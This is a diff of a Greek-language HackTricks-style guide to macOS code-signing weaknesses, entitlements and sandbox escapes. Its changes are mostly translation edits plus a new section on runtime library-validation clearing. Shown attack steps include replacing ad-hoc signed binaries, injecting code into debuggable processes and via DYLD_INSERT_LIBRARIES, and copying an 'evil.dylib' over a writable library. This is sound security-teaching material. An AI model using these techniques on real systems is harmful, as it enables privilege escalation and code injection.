@@ -1,4 +1,4 @@
-# Αδυναμίες Code Signing στο macOS & Διαφυγές από Sandbox
+# Αδυναμίες Code Signing του macOS και Sandbox Escapes
 
 {{#include ../../../banners/hacktricks-training.md}}
 
@@ -6,18 +6,18 @@
 
 ### Βασικές πληροφορίες
 
-Το **Ad-hoc signing** (`CS_ADHOC`) δημιουργεί μια code signature με **καμία αλυσίδα πιστοποιητικών** — πρόκειται για ένα hash του κώδικα, χωρίς επαλήθευση ταυτότητας developer. Η προέλευση του binary δεν μπορεί να συσχετιστεί με κάποιον developer ή οργανισμό.<sup>[[1]](#references)[[4]](#references)</sup>
+Το **Ad-hoc signing** (`CS_ADHOC`) δημιουργεί μια code signature **χωρίς certificate chain** — είναι ένα hash του code χωρίς verification της ταυτότητας developer. Η προέλευση του binary δεν μπορεί να αποδοθεί σε κάποιον developer ή οργανισμό.<sup>[[1]](#references)[[4]](#references)</sup>
 
-Σε Mac με Apple Silicon, όλα τα executables απαιτούν τουλάχιστον μια ad-hoc signature. Αυτό σημαίνει ότι θα βρείτε ad-hoc signatures σε πολλά development tools, πακέτα Homebrew και third-party utilities.
+Σε Mac με Apple Silicon, όλα τα executables απαιτούν τουλάχιστον μια ad-hoc signature. Αυτό σημαίνει ότι θα βρείτε ad-hoc signatures σε πολλά development tools, Homebrew packages και third-party utilities.
 
 ### Γιατί έχει σημασία
 
-- **Καμία επαληθεύσιμη ταυτότητα** — το binary μπορεί να αντικατασταθεί χωρίς να εντοπιστεί από identity-based ελέγχους
-- Third-party ad-hoc binaries σε **προνομιούχες θέσεις** (FDA, daemon, helpers) αποτελούν στόχους υψηλής προτεραιότητας
-- Σε ορισμένες διαμορφώσεις, οι ad-hoc signatures ενδέχεται να **μην επαληθεύονται τόσο αυστηρά** όσο ο κώδικας με developer signature
-- Ad-hoc signed binaries που διαθέτουν **TCC grants** είναι ιδιαίτερα πολύτιμα — τα grants παραμένουν ακόμη και αν αλλάξει το περιεχόμενο του binary (εξαρτάται από τον τρόπο με τον οποίο το TCC έκανε key το grant)
+- **Καμία επαληθεύσιμη ταυτότητα** — το binary μπορεί να αντικατασταθεί χωρίς να εντοπιστεί από identity-based checks
+- Third-party ad-hoc binaries σε **privileged positions** (FDA, daemon, helpers) αποτελούν στόχους υψηλής προτεραιότητας
+- Σε ορισμένες διαμορφώσεις, οι ad-hoc signatures μπορεί **να μην επαληθεύονται τόσο αυστηρά** όσο ο developer-signed code
+- Ad-hoc signed binaries που έχουν **TCC grants** είναι ιδιαίτερα πολύτιμα — τα grants παραμένουν ακόμη και αν αλλάξει το περιεχόμενο του binary (εξαρτάται από τον τρόπο με τον οποίο το TCC έκανε key το grant)
 
-### Ανακάλυψη
+### Discovery
 ```bash
 # Find ad-hoc signed binaries
 find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
@@ -29,7 +29,7 @@ echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
 codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
 # Ad-hoc shows: "Signature=adhoc" and no Authority lines
 ```
-### Επίθεση: Binary Replacement
+### Attack: Binary Replacement
 ```bash
 # If an ad-hoc signed daemon binary is in a writable location:
 # 1. Check the binary's current capabilities
@@ -54,14 +54,14 @@ codesign -s - /path/to/target
 
 ### Βασικές πληροφορίες
 
-Το **`com.apple.security.get-task-allow`** entitlement (ή η σημαία **`CS_GET_TASK_ALLOW`**) επιτρέπει σε **οποιοδήποτε process να συνδεθεί ως debugger**, να διαβάσει τη μνήμη, να τροποποιήσει registers, να κάνει code injection και να ελέγξει την εκτέλεση.<sup>[[3]](#references)</sup>
+Το **`com.apple.security.get-task-allow`** entitlement (ή το flag **`CS_GET_TASK_ALLOW`**) επιτρέπει σε **οποιοδήποτε process να συνδεθεί ως debugger**, να διαβάσει τη μνήμη, να τροποποιήσει registers, να κάνει code injection και να ελέγξει την εκτέλεση.<sup>[[3]](#references)</sup>
 
 Αυτό προορίζεται **μόνο για development builds**. Ωστόσο, ορισμένα third-party binaries αποστέλλονται με αυτό το entitlement σε production.
 
 > [!CAUTION]
-> Ένα production binary με `get-task-allow` αποτελεί **άμεσο exploitation primitive**. Οποιοδήποτε local process μπορεί να καλέσει το `task_for_pid()`, να αποκτήσει το Mach task port του target και να κάνει inject arbitrary code που εκτελείται με τα entitlements, τα TCC grants και το security context του target.
+> Ένα production binary με `get-task-allow` αποτελεί **instant exploitation primitive**. Οποιοδήποτε local process μπορεί να καλέσει το `task_for_pid()`, να αποκτήσει το Mach task port του στόχου και να κάνει inject arbitrary code, το οποίο εκτελείται με τα entitlements, τα TCC grants και το security context του στόχου.
 
-### Εντοπισμός
+### Ανακάλυψη
 ```bash
 # Find debuggable binaries
 find /Applications /usr/local -type f -perm +111 -exec sh -c '
@@ -105,13 +105,17 @@ VM_PROT_READ | VM_PROT_EXECUTE);
 
 ## No Library Validation + DYLD Environment
 
-### Ο Θανατηφόρος Συνδυασμός
+### Runtime Library-Validation Clearing
 
-Όταν ένα binary έχει **και τα δύο**:<sup>[[3]](#references)</sup>
-- `com.apple.security.cs.disable-library-validation` (loads any dylib)
-- `com.apple.security.cs.allow-dyld-environment-variables` (accepts DYLD env vars)
+Το private entitlement **`com.apple.private.security.clear-library-validation`** δεν απενεργοποιεί το library validation κατά την εκκίνηση της διεργασίας. Αντίθετα, επιτρέπει στη διεργασία να καλέσει το `csops(..., CS_OPS_CLEAR_LV, ...)` στον εαυτό της κατά το runtime. Στη συνέχεια, το XNU εκκαθαρίζει τα `CS_REQUIRE_LV | CS_FORCED_LV`, υπό την προϋπόθεση ότι ο caller διαθέτει το entitlement και πληροί τους πρόσθετους ελέγχους του handler. Κατά συνέπεια, μια διεργασία μπορεί να γίνει viable library-injection target μόνο αφού φτάσει στο code path που εκκαθαρίζει το library validation.<sup>[[4]](#references)[[5]](#references)</sup>
 
-Αυτό είναι ένα **εγγυημένο code injection primitive** — το `DYLD_INSERT_LIBRARIES` λειτουργεί άψογα.
+### The Deadly Combination
+
+Όταν ένα binary διαθέτει **και τα δύο**:<sup>[[3]](#references)</sup>
+- `com.apple.security.cs.disable-library-validation` (φορτώνει οποιοδήποτε dylib)
+- `com.apple.security.cs.allow-dyld-environment-variables` (δέχεται DYLD env vars)
+
+Αυτό είναι ένα **guaranteed code injection primitive** — το `DYLD_INSERT_LIBRARIES` λειτουργεί άψογα.
 
 ### Discovery
 ```bash
@@ -170,19 +174,19 @@ cat /tmp/injected_proof.txt
 
 ### Πώς αποδυναμώνουν το Sandbox
 
-Οι προσωρινές εξαιρέσεις του Sandbox (`com.apple.security.temporary-exception.*`) ανοίγουν «τρύπες» στο App Sandbox:<sup>[[2]](#references)</sup>
+Οι προσωρινές εξαιρέσεις του Sandbox (`com.apple.security.temporary-exception.*`) δημιουργούν κενά στο App Sandbox:<sup>[[2]](#references)</sup>
 
-| Εξαίρεση | Τι επιτρέπει |
+| Exception | Τι επιτρέπει |
 |---|---|
-| `temporary-exception.mach-lookup.global-name` | Σύνδεση σε XPC/Mach services σε επίπεδο συστήματος |
+| `temporary-exception.mach-lookup.global-name` | Σύνδεση σε XPC/Mach services σε επίπεδο ολόκληρου του συστήματος |
 | `temporary-exception.files.absolute-path.read-write` | Ανάγνωση/εγγραφή αρχείων εκτός του app container |
 | `temporary-exception.iokit-user-client-class` | Άνοιγμα συνδέσεων IOKit user-client |
 | `temporary-exception.shared-preference.read-only` | Ανάγνωση των preferences άλλων apps |
 | `temporary-exception.files.home-relative-path.read-write` | Πρόσβαση σε paths σχετικά με το `~` |
 
-### Mach-Lookup Exceptions = Primitive για Sandbox Escape
+### Οι εξαιρέσεις Mach-Lookup = Primitive για Sandbox Escape
 
-Η πιο επικίνδυνη εξαίρεση είναι το **mach-lookup** — επιτρέπει σε ένα sandboxed app να επικοινωνεί με προνομιούχους daemons:
+Η πιο επικίνδυνη εξαίρεση είναι το **mach-lookup** — επιτρέπει σε ένα sandboxed app να επικοινωνεί με privileged daemons:
 ```bash
 # Find apps with mach-lookup exceptions
 find /Applications -name "*.app" -exec sh -c '
@@ -196,7 +200,7 @@ echo "[$count exceptions] $(basename "$1")"
 }
 ' _ {} \; 2>/dev/null | sort -rn
 ```
-### Επίθεση: Sandbox Escape μέσω Mach-Lookup
+### Attack: Sandbox Escape via Mach-Lookup
 ```
 1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
 2. Read entitlements to discover mach-lookup exceptions
@@ -213,21 +217,21 @@ c. Fuzz each exposed method
 
 ### Τι είναι
 
-Τα entitlements με πρόθεμα `com.apple.private.*` παρέχουν πρόσβαση σε **Apple-internal APIs** που δεν είναι τεκμηριωμένα ή διαθέσιμα σε third-party developers. Third-party binaries με private entitlements τα απέκτησαν μέσω enterprise cert, MDM ή non-App-Store distribution.
+Τα entitlements με πρόθεμα `com.apple.private.*` παρέχουν πρόσβαση σε **Apple-internal APIs**, τα οποία δεν είναι τεκμηριωμένα ούτε διαθέσιμα σε third-party developers. Τα third-party binaries με private entitlements τα απέκτησαν μέσω enterprise cert, MDM ή διανομής εκτός App Store.
 
 ### Επικίνδυνα Private Entitlements
 
-| Entitlement | Capability |
+| Entitlement | Δυνατότητα |
 |---|---|
-| `com.apple.private.tcc.manager` | Πλήρες read/write στη βάση δεδομένων TCC |
-| `com.apple.private.tcc.allow` | Πρόσβαση σε συγκεκριμένες TCC services |
+| `com.apple.private.tcc.manager` | Πλήρης ανάγνωση/εγγραφή της βάσης δεδομένων TCC |
+| `com.apple.private.tcc.allow` | Πρόσβαση σε συγκεκριμένες υπηρεσίες TCC |
 | `com.apple.private.security.no-sandbox` | Εκτέλεση χωρίς sandbox |
-| `com.apple.private.iokit` | Άμεση πρόσβαση σε IOKit drivers |
+| `com.apple.private.iokit` | Απευθείας πρόσβαση σε IOKit drivers |
 | `com.apple.private.kernel.\*` | Πρόσβαση σε kernel interfaces |
-| `com.apple.private.xpc.launchd.job-label` | Καταχώριση/διαχείριση launchd jobs |
-| `com.apple.rootless.install` | Εγγραφή σε SIP-protected paths |
+| `com.apple.private.xpc.launchd.job-label` | Εγγραφή/διαχείριση launchd jobs |
+| `com.apple.rootless.install` | Εγγραφή σε διαδρομές που προστατεύονται από το SIP |
 
-### Discovery
+### Εντοπισμός
 ```bash
 # Find third-party binaries with private entitlements
 find /Applications /usr/local -type f -perm +111 -exec sh -c '
@@ -246,13 +250,13 @@ ORDER BY privileged DESC;"
 ```
 ---
 
-## Custom Sandbox Profiles (SBPL)
+## Προσαρμοσμένα Sandbox Profiles (SBPL)
 
 ### Τι είναι
 
-Τα binaries μπορούν να περιλαμβάνουν **custom sandbox profiles** γραμμένα σε SBPL (Seatbelt Profile Language). Αυτά τα profiles μπορεί να είναι πιο περιοριστικά Ή **πιο permissive** από το προεπιλεγμένο App Sandbox.
+Τα Binaries μπορούν να διανέμονται με **προσαρμοσμένα sandbox profiles** γραμμένα σε SBPL (Seatbelt Profile Language). Αυτά τα profiles μπορεί να είναι πιο περιοριστικά Ή **πιο permissive** από το προεπιλεγμένο App Sandbox.
 
-### Έλεγχος Custom Profiles
+### Έλεγχος προσαρμοσμένων Profiles
 ```bash
 # Find custom sandbox profiles
 find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null
@@ -272,11 +276,11 @@ cat /path/to/custom.sb | grep "(allow" | sort -u
 
 ## Διαδρομές Βιβλιοθηκών με Δυνατότητα Εγγραφής
 
-### Τι είναι
+### Τι Είναι
 
 Όταν ένα binary φορτώνει μια dynamic library από μια διαδρομή στην οποία ο τρέχων χρήστης μπορεί να κάνει **write**, η βιβλιοθήκη μπορεί να αντικατασταθεί με malicious code.
 
-### Εντοπισμός
+### Ανακάλυψη
 ```bash
 # Using the scanner — find privileged binaries loading from writable paths
 sqlite3 /tmp/executables.db "
@@ -293,7 +297,7 @@ otool -L /path/to/binary | awk '{print $1}' | while read lib; do
 [ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
 done
 ```
-### Επίθεση: Dylib Replacement
+### Attack: Dylib Replacement
 ```bash
 # 1. Find the writable library
 otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"
@@ -317,12 +321,11 @@ cp /tmp/evil.dylib /path/to/writable.dylib
 
 # 5. When the daemon restarts, it loads the evil dylib with daemon privileges
 ```
-## Αναφορές
+## References
 
-- [1] [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
+- [1] [Apple Developer — Οδηγός Code Signing](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
 - [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
 - [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
-- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*` operations and `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
-- [5] [XNU — `bsd/kern/kern_proc.c` (`csops` / `CS_OPS_CLEAR_LV` handler)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
-
+- [4] [XNU — `bsd/sys/codesign.h` (λειτουργίες `CS_OPS_*` και `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
+- [5] [XNU — `bsd/kern/kern_proc.c` (handler των `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
 {{#include ../../../banners/hacktricks-training.md}}
